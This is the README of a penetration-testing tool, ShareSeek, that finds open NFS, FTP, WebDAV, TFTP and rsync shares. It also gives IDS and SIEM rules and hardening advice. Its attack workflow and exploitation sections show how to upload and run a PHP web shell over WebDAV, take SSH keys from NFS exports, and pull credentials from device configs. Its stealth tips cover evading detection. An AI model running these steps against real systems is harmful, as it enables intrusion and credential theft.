# ShareSeek

## Overview
ShareSeek is a comprehensive network share discovery tool designed for internal penetration testing and security assessments. It identifies and enumerates network file sharing services including NFS (Network File System), FTP (File Transfer Protocol), WebDAV (Web Distributed Authoring and Versioning), TFTP (Trivial FTP), and rsync servers.

Network shares are often misconfigured and can provide unauthorized access to sensitive data, credentials, and system files. ShareSeek helps security professionals quickly identify these exposures across large networks.

## Features

### Multi-Protocol Support
- **NFS (Network File System)**: Unix/Linux network file sharing
- **FTP (File Transfer Protocol)**: Traditional file transfer
- **WebDAV**: HTTP-based file sharing
- **TFTP (Trivial FTP)**: Simplified UDP-based file transfer
- **rsync**: Incremental file synchronization protocol

### Share Enumeration
- Anonymous FTP detection
- NFS export listing
- rsync module enumeration
- WebDAV path discovery
- TFTP server detection

### Access Testing
- Anonymous FTP login attempts
- NFS export accessibility checks
- rsync module listing
- WebDAV method detection

### Detailed Reporting
- Share list for mounting (`sharelist.txt`)
- Detailed findings (`share_details.txt`)
- JSON export (`share_details.json`)
- Real-time console output

## Installation

### Prerequisites
```bash
# Kali Linux (recommended, most tools pre-installed)
sudo apt update

# Ubuntu/Debian
sudo apt install python3 python3-pip nfs-common rsync

# CentOS/RHEL
sudo yum install python3 nfs-utils rsync

# macOS
brew install python3 nfs-client rsync
```

### Installation Steps
```bash
# 1. Clone or download
cd /opt/tools
git clone <repository-url> shareseek
cd shareseek

# 2. Make executable
chmod +x shareseek.py

# 3. Create IP list
echo "192.168.1.0/24" > iplist.txt

# 4. Test installation
./shareseek.py -h
```

## Usage

### Basic Usage
```bash
# Scan using iplist.txt (default)
./shareseek.py

# Specify targets file
./shareseek.py -f targets.txt

# Verbose output (show all hosts)
./shareseek.py -v
```

### Performance Tuning
```bash
# Fast scan (20 workers)
./shareseek.py -w 20

# Slow/careful scan
./shareseek.py -w 5 --timeout 5

# Custom timeout
./shareseek.py --timeout 10
```

### Command-Line Options
```
Positional Arguments:
  None (uses iplist.txt by default)

Optional Arguments:
  -h, --help          Show help message
  -f, --file FILE     Input file with IP addresses (default: iplist.txt)
  -w, --workers N     Number of concurrent workers (default: 10)
  --timeout N         Connection timeout in seconds (default: 2)
  -v, --verbose       Verbose output (show all hosts)
```

## Input File Format

### IP List File (iplist.txt)
```
# File servers
192.168.1.50
192.168.1.51
192.168.1.52

# Storage subnet
192.168.10.0/24

# Legacy systems
10.0.5.0/24

# Comments are allowed
# Blank lines are ignored
```

### Supported Formats
- Individual IP addresses: `192.168.1.10`
- CIDR notation: `192.168.1.0/24`
- Comments with `#`
- Blank lines ignored

## Output Files

### sharelist.txt
Simple list of accessible shares:
```
ftp://192.168.1.50
192.168.1.51:/data
192.168.1.51:/backup
rsync://192.168.1.52/files
http://192.168.1.53:80/webdav
tftp://192.168.1.54
```
**Use case**: Direct mounting or access

### share_details.txt
Comprehensive findings:
```
ShareSeek - Network Share Discovery Results
======================================================================
Scan Date: 2025-10-14 12:00:00
Total Hosts with Shares: 5
======================================================================

Host: 192.168.1.50
Hostname: fileserver01.company.local
⚠ ANONYMOUS ACCESS ALLOWED
Services Found: FTP
----------------------------------------------------------------------

  Service: FTP
  Banner: 220 ProFTPD 1.3.5 Server (FileServer01)
  Anonymous Access: YES

Accessible Shares (1):
  ✓ ftp://192.168.1.50

======================================================================

Host: 192.168.1.51
Hostname: nfs-server.company.local
Services Found: NFS
----------------------------------------------------------------------

  Service: NFS
  Exports:
    /data (*)
    /backup (192.168.0.0/16)
    /home (10.0.0.0/8)

Accessible Shares (3):
  ✓ 192.168.1.51:/data
  ✓ 192.168.1.51:/backup
  ✓ 192.168.1.51:/home

======================================================================
```

### share_details.json
Machine-readable JSON:
```json
[
  {
    "ip": "192.168.1.50",
    "hostname": "fileserver01.company.local",
    "shares_found": true,
    "services": {
      "FTP": {
        "enabled": true,
        "banner": "220 ProFTPD 1.3.5 Server (FileServer01)",
        "anonymous": true,
        "error": null
      }
    },
    "accessible_shares": [
      {
        "type": "FTP",
        "path": "ftp://192.168.1.50",
        "anonymous": true
      }
    ],
    "anonymous_access": true,
    "error": null
  },
  {
    "ip": "192.168.1.51",
    "hostname": "nfs-server.company.local",
    "shares_found": true,
    "services": {
      "NFS": {
        "enabled": true,
        "exports": [
          {
            "path": "/data",
            "clients": "*"
          },
          {
            "path": "/backup",
            "clients": "192.168.0.0/16"
          },
          {
            "path": "/home",
            "clients": "10.0.0.0/8"
          }
        ],
        "error": null
      }
    },
    "accessible_shares": [
      {
        "type": "NFS",
        "path": "192.168.1.51:/data",
        "clients": "*"
      },
      {
        "type": "NFS",
        "path": "192.168.1.51:/backup",
        "clients": "192.168.0.0/16"
      },
      {
        "type": "NFS",
        "path": "192.168.1.51:/home",
        "clients": "10.0.0.0/8"
      }
    ],
    "anonymous_access": false,
    "error": null
  }
]
```

## Share Protocols

### NFS (Network File System)

**Port**: 2049 (TCP/UDP)  
**Common on**: Linux, Unix, ESXi, NAS devices

**Detection Method**:
```bash
showmount -e 192.168.1.51
```

**Export Format**:
```
Export list for 192.168.1.51:
/data            *
/backup          192.168.0.0/16
/home            10.0.0.0/8
/var/www/uploads (everyone)
```

**Access Levels**:
- `*`: World-accessible (any client)
- `192.168.0.0/16`: Network-restricted
- `hostname.domain`: Host-specific
- `(everyone)`: Open to all

**Mounting**:
```bash
# Mount NFS share
mount -t nfs 192.168.1.51:/data /mnt/data

# Mount with specific version
mount -t nfs -o vers=3 192.168.1.51:/data /mnt/data

# List mounted NFS shares
df -h -t nfs
```

### FTP (File Transfer Protocol)

**Port**: 21 (TCP)  
**Common on**: Windows Server, Linux, network devices

**Detection Method**:
```bash
# Connect and get banner
telnet 192.168.1.50 21

# Anonymous login test
USER anonymous
PASS anonymous@
```

**Common Banners**:
- `220 ProFTPD`: Linux ProFTPD
- `220 Microsoft FTP Service`: Windows IIS
- `220 vsftpd`: Very Secure FTP Daemon
- `220 FileZilla Server`: FileZilla

**Anonymous Access**:
```bash
# Command-line FTP client
ftp 192.168.1.50
# Username: anonymous
# Password: (anything or anonymous@)

# lftp (better client)
lftp ftp://192.168.1.50
```

### WebDAV (Web Distributed Authoring and Versioning)

**Ports**: 80, 443, 8080 (HTTP/HTTPS)  
**Common on**: Windows Server, Apache, Nginx, OwnCloud, Nextcloud

**Detection Method**:
```bash
# OPTIONS request
curl -X OPTIONS -i http://192.168.1.53/webdav

# Look for DAV header and methods:
# Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK
# DAV: 1, 2
```

**Common Paths**:
- `/webdav`
- `/dav`
- `/remote.php/webdav` (Nextcloud)
- `/servlet/webdav`
- `/` (root)

**Mounting**:
```bash
# Linux (davfs2)
mount -t davfs http://192.168.1.53/webdav /mnt/webdav

# Windows
net use Z: http://192.168.1.53/webdav

# macOS Finder
# Go > Connect to Server > http://192.168.1.53/webdav
```

### TFTP (Trivial FTP)

**Port**: 69 (UDP)  
**Common on**: Network devices (routers, switches), PXE boot servers

**Detection Method**:
```bash
# Test TFTP (will fail but confirms service)
tftp 192.168.1.54
> get test.txt
```

**No Authentication**: TFTP has no authentication mechanism

**Common Uses**:
- Cisco configuration backups
- Network device firmware updates
- PXE boot images
- Lightweight file transfer

**Access**:
```bash
# Download file
tftp 192.168.1.54
> get config.txt

# Upload file
tftp 192.168.1.54
> put backup.conf

# Or one-liner
tftp 192.168.1.54 -c get config.txt
```

### rsync

**Port**: 873 (TCP)  
**Common on**: Linux backup servers, file sync systems

**Detection Method**:
```bash
# List modules
rsync rsync://192.168.1.52/
```

**Module Format**:
```
files       File repository
backups     Backup storage
logs        System logs
```

**Access**:
```bash
# List module contents
rsync rsync://192.168.1.52/files/

# Download file
rsync rsync://192.168.1.52/files/data.txt ./

# Download directory
rsync -av rsync://192.168.1.52/files/ ./files/

# Check for writable access
rsync test.txt rsync://192.168.1.52/files/
```

## Attack Workflows

### Workflow 1: Quick Discovery
```bash
# 1. Fast scan
./shareseek.py -w 20

# 2. Review findings
cat sharelist.txt

# 3. Test anonymous access
# FTP
ftp 192.168.1.50  # username: anonymous

# NFS
showmount -e 192.168.1.51
mount -t nfs 192.168.1.51:/data /mnt/data

# 4. Search for sensitive files
grep -r "password\|credential\|secret" /mnt/data/
```

### Workflow 2: NFS Enumeration
```bash
# 1. Find NFS servers
./shareseek.py | grep NFS

# 2. List all exports
for ip in $(grep "://" sharelist.txt | cut -d: -f1); do
    echo "=== $ip ==="
    showmount -e $ip
done

# 3. Mount and explore
mount -t nfs 192.168.1.51:/data /mnt/nfs
ls -laR /mnt/nfs > nfs_contents.txt

# 4. Look for sensitive data
find /mnt/nfs -name "*.conf" -o -name "*.xml" -o -name "*.bak"
find /mnt/nfs -name "*password*" -o -name "*credential*"
```

### Workflow 3: FTP Anonymous Access
```bash
# 1. Find FTP servers with anonymous access
./shareseek.py -v | grep ANONYMOUS

# 2. Connect and enumerate
lftp ftp://192.168.1.50
lftp> mirror -c /

# 3. Search downloaded files
grep -ri "password" ./ftp-mirror/
grep -ri "username" ./ftp-mirror/

# 4. Check for writeable directories
lftp> put test.txt
# If successful, potential for malicious uploads
```

### Workflow 4: WebDAV Exploitation
```bash
# 1. Find WebDAV servers
./shareseek.py | grep WebDAV

# 2. Test methods
curl -X OPTIONS http://192.168.1.53/webdav

# 3. Test for write access
curl -X PUT http://192.168.1.53/webdav/test.txt -d "test"

# 4. If writable, upload web shell
curl -X PUT http://192.168.1.53/webdav/shell.php \
    -d '<?php system($_GET["cmd"]); ?>'

# 5. Execute
curl http://192.168.1.53/webdav/shell.php?cmd=whoami
```

### Workflow 5: TFTP Configuration Theft
```bash
# 1. Find TFTP servers
./shareseek.py | grep TFTP

# 2. Attempt common config files
tftp 192.168.1.54 -c get startup-config
tftp 192.168.1.54 -c get running-config
tftp 192.168.1.54 -c get config.txt

# 3. Cisco device configs
tftp 192.168.1.54 -c get router-confg
tftp 192.168.1.54 -c get switch-config

# 4. Extract credentials
cat startup-config | grep -i "password\|secret\|community"
```

## Exploitation Examples

### Example 1: Anonymous FTP Data Breach
```bash
# Discovery
./shareseek.py -f servers.txt
# Found: 192.168.1.50 - FTP [ANONYMOUS]

# Access
ftp 192.168.1.50
# Username: anonymous
# Password: (blank)

# Enumerate
ftp> ls -laR

# Found: /backup/database_backup_20250114.sql
ftp> get database_backup_20250114.sql

# Result: Full database dump with user credentials
```

### Example 2: NFS World-Readable Export
```bash
# Discovery
./shareseek.py
# Found: 192.168.1.51:/home (*)

# Mount
mount -t nfs 192.168.1.51:/home /mnt/home

# Explore
ls -la /mnt/home/
# Found: admin/, dbadmin/, root/

# Extract SSH keys
cp /mnt/home/admin/.ssh/id_rsa ./admin_key
chmod 600 admin_key

# Result: SSH key for privileged user
ssh -i admin_key admin@192.168.1.100
```

### Example 3: WebDAV Upload & Shell
```bash
# Discovery
./shareseek.py
# Found: http://192.168.1.53:80/webdav

# Test write access
curl -X PUT http://192.168.1.53/webdav/test.txt -d "test"
# HTTP/1.1 201 Created

# Upload PHP shell
curl -X PUT http://192.168.1.53/webdav/cmd.php \
    -d '<?php system($_GET["c"]); ?>'

# Execute commands
curl http://192.168.1.53/webdav/cmd.php?c=whoami
# www-data

# Result: Web shell with www-data privileges
```

### Example 4: rsync Module Access
```bash
# Discovery
./shareseek.py
# Found: rsync://192.168.1.52/backups

# List contents
rsync rsync://192.168.1.52/backups/

# Found: windows_backups/, linux_configs/

# Download everything
rsync -av rsync://192.168.1.52/backups/ ./backups/

# Extract credentials
grep -ri "password" ./backups/
grep -ri "connectionstring" ./backups/

# Result: Application database credentials
```

## Integration with Other Tools

### With Nmap
```bash
# 1. Fast port discovery
nmap -p 21,69,873,2049 -open 192.168.1.0/24 -oG - | \
    grep "/open/" | cut -d' ' -f2 > share_hosts.txt

# 2. ShareSeek detailed scan
./shareseek.py -f share_hosts.txt -v

# 3. Full enumeration
nmap -sV -p 21,69,873,2049 -iL sharelist.txt
```

### With SMB Enumeration
```bash
# 1. Find all shares (SMB + others)
./shareseek.py
smbmap -H 192.168.1.0/24

# 2. Combine results
cat sharelist.txt smb_shares.txt > all_shares.txt

# 3. Test access to all
# Scripts to mount each and test
```

### With Metasploit
```bash
# NFS enumeration
msfconsole
use auxiliary/scanner/nfs/nfsmount
set RHOSTS file:sharelist.txt
run

# FTP anonymous access
use auxiliary/scanner/ftp/anonymous
set RHOSTS file:sharelist.txt
run
```

### With Custom Scripts
```python
# Automated share mounting and data extraction
import json

with open('share_details.json') as f:
    shares = json.load(f)

for host in shares:
    for share in host['accessible_shares']:
        if share['type'] == 'NFS':
            # Mount NFS
            os.system(f"mount -t nfs {share['path']} /mnt/nfs_{host['ip']}")
            # Search for files
            os.system(f"find /mnt/nfs_{host['ip']} -name '*.conf' -exec cat {{}} \;")
```

## Detection & Defense

### Detection Signatures

**Network IDS (Snort/Suricata)**:
```
# NFS showmount enumeration
alert tcp any any -> $HOME_NET 2049 (
    msg:"ET SCAN NFS Showmount Request";
    flow:to_server,established;
    content:"|00 00 00 00 00 00 00 01|";
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:2000100;
)

# Anonymous FTP login attempts
alert tcp any any -> $HOME_NET 21 (
    msg:"ET FTP Anonymous Login Attempt";
    flow:to_server,established;
    content:"USER anonymous";
    threshold:type threshold, track by_src, count 3, seconds 60;
    sid:2000101;
)

# WebDAV enumeration
alert tcp any any -> $HOME_NET any (
    msg:"ET SCAN WebDAV OPTIONS Request";
    flow:to_server,established;
    content:"OPTIONS ";
    content:"WebDAV";
    threshold:type threshold, track by_src, count 5, seconds 60;
    sid:2000102;
)
```

**SIEM Correlation Rules**:
```
# Rule 1: Multiple share protocol scans
source_type = "firewall"
destination_port IN [21, 69, 873, 2049]
unique_ports > 2
within 5 minutes
→ ALERT: Share discovery scan detected

# Rule 2: Anonymous FTP access
source_type = "ftp_logs"
username = "anonymous"
source_ip NOT IN [known_backup_servers]
→ ALERT: Anonymous FTP access from unusual source

# Rule 3: NFS export enumeration
source_type = "nfs_logs"
message_type = "showmount"
count > 10 within 10 minutes
→ ALERT: NFS enumeration detected
```

**Log Monitoring**:
```bash
# NFS access logs
tail -f /var/log/syslog | grep nfsd

# FTP logs
tail -f /var/log/vsftpd.log
tail -f /var/log/proftpd.log

# WebDAV (Apache)
tail -f /var/log/apache2/access.log | grep -E "OPTIONS|PROPFIND|MKCOL"

# rsync logs
tail -f /var/log/rsyncd.log
```

### Defense Measures

**NFS Hardening**:
```bash
# /etc/exports - Restrict exports
# BAD: /data *(rw,no_root_squash)
# GOOD:
/data 192.168.1.0/24(rw,root_squash,no_subtree_check)
/backup 192.168.1.100(ro,root_squash)

# Apply changes
exportfs -ra

# Disable NFSv3 (use NFSv4 only)
# /etc/nfs.conf
[nfsd]
vers3=no
vers4=yes
```

**FTP Hardening**:
```bash
# vsftpd configuration (/etc/vsftpd.conf)
anonymous_enable=NO
local_enable=YES
write_enable=NO
chroot_local_user=YES

# Restart service
systemctl restart vsftpd

# Or disable FTP entirely
systemctl stop vsftpd
systemctl disable vsftpd
```

**WebDAV Hardening**:
```apache
# Apache configuration
<Location /webdav>
    AuthType Basic
    AuthName "WebDAV"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
    
    # Restrict methods
    <LimitExcept GET HEAD OPTIONS PROPFIND>
        Require user admin
    </LimitExcept>
</Location>

# Create password file
htpasswd -c /etc/apache2/.htpasswd admin
```

**TFTP Hardening**:
```bash
# Restrict TFTP to specific directory
# /etc/xinetd.d/tftp
server_args = -s /tftpboot -c

# Limit access by IP
only_from = 192.168.1.0/24

# Or disable TFTP
systemctl stop tftpd
systemctl disable tftpd
```

**rsync Hardening**:
```bash
# /etc/rsyncd.conf
[files]
    path = /srv/rsync/files
    read only = yes
    list = no
    auth users = backup
    secrets file = /etc/rsyncd.secrets
    hosts allow = 192.168.1.0/24

# Create secrets file
echo "backup:strongpassword123" > /etc/rsyncd.secrets
chmod 600 /etc/rsyncd.secrets
```

**Firewall Rules**:
```bash
# iptables - Restrict share services
iptables -A INPUT -p tcp --dport 21 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j DROP

iptables -A INPUT -p tcp --dport 2049 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 2049 -j DROP

# Block from internet
iptables -A INPUT -p tcp --dport 21 -s 0.0.0.0/0 -j DROP
iptables -A INPUT -p tcp --dport 2049 -s 0.0.0.0/0 -j DROP
iptables -A INPUT -p udp --dport 69 -s 0.0.0.0/0 -j DROP
```

## Troubleshooting

### Common Issues

**"showmount not found"**
```bash
# Install NFS client tools
sudo apt install nfs-common  # Debian/Ubuntu
sudo yum install nfs-utils   # CentOS/RHEL
brew install nfs-client      # macOS
```

**"rsync not found"**
```bash
# Install rsync
sudo apt install rsync       # Debian/Ubuntu
sudo yum install rsync       # CentOS/RHEL
brew install rsync           # macOS
```

**"No shares found"**
```bash
# Manual verification - NFS
showmount -e 192.168.1.51

# Manual verification - FTP
ftp 192.168.1.50

# Manual verification - rsync
rsync rsync://192.168.1.52/

# Increase timeout
./shareseek.py --timeout 10
```

**"Connection refused"**
```bash
# Verify port is open
nmap -p 21,69,873,2049 192.168.1.50

# Check firewall
iptables -L -n | grep -E "21|69|873|2049"

# Test connectivity
telnet 192.168.1.50 21
```

**Permission denied mounting NFS**
```bash
# May need root
sudo mount -t nfs 192.168.1.51:/data /mnt/data

# Check export restrictions
showmount -e 192.168.1.51

# Try different NFS version
mount -t nfs -o vers=3 192.168.1.51:/data /mnt/data
```

## Tips & Tricks

### 🎯 Targeting
- **Look for file servers**: Hostnames like fileserver, nas, storage
- **Legacy systems**: Often have open shares
- **Development environments**: Frequently misconfigured
- **Backup servers**: May have world-readable NFS exports

### 🔍 Reconnaissance
- **DNS enumeration**: Find share servers by name
- **Port scan first**: Filter to hosts with share ports open
- **Check documentation**: Network diagrams often show file servers
- **Ask users**: "Where do you store files?"

### 🔒 Stealth
- **Slow scans**: `-w 5` to avoid detection
- **Blend in**: Share enumeration is common in networks
- **Off-hours**: Scan during backup windows
- **Use VPN**: Appear as internal user

### ⚡ Speed
- **High workers**: `-w 50` for large networks
- **Pre-filter**: Use Nmap to find open ports first
- **Parallel instances**: Split network ranges
- **Reduce timeout**: `--timeout 1` for fast networks

### 🎓 Learning
- **Lab setup**: Configure NFS, FTP, WebDAV servers
- **Practice mounting**: Learn each protocol's quirks
- **Read RFCs**: Understand protocol internals
- **Study misconfigurations**: Common security mistakes

## Real-World Examples

### Example 1: Corporate File Server
```bash
./shareseek.py -f corporate_servers.txt
# Scanned: 500 servers
# Found: 12 NFS exports, 3 FTP servers, 1 WebDAV
# Anonymous FTP: 1 server (192.168.1.50)
# Result: HR documents and payroll data accessible
```

### Example 2: NFS World-Readable
```bash
./shareseek.py
# Found: 192.168.1.51:/home (*)
# Mounted and found SSH keys for 50+ users
# Result: Lateral movement to entire network
```

### Example 3: WebDAV Shell Upload
```bash
./shareseek.py
# Found: http://192.168.1.53/webdav (PUT method allowed)
# Uploaded PHP web shell
# Result: Web server compromise
```

## Security Considerations

### For Penetration Testers
- **Authorization**: Ensure written permission
- **Scope**: Verify all targets are in scope
- **Data handling**: Secure any extracted data
- **Documentation**: Record all accessed shares
- **Cleanup**: Remove any uploaded test files

### For Defenders
- **Inventory**: Know all network shares
- **Authentication**: Never allow anonymous access
- **Least privilege**: Restrict access by IP/user
- **Monitoring**: Alert on unusual access patterns
- **Regular audits**: Scan your own network with ShareSeek

## References
- **NFS**: RFC 1813, RFC 3530 (NFSv4)
- **FTP**: RFC 959
- **WebDAV**: RFC 4918
- **TFTP**: RFC 1350
- **rsync**: https://rsync.samba.org/
- **MITRE ATT&CK**: T1039 (Data from Network Shared Drive)
- **CWE-284**: Improper Access Control

## License
This tool is for authorized security testing only. Unauthorized access to network shares is illegal.

## Changelog
- **v1.0**: Initial release with NFS, FTP, WebDAV, TFTP, rsync support

---

**Remember**: Network shares are a common entry point and lateral movement technique. Always test your own networks to find exposures before attackers do.
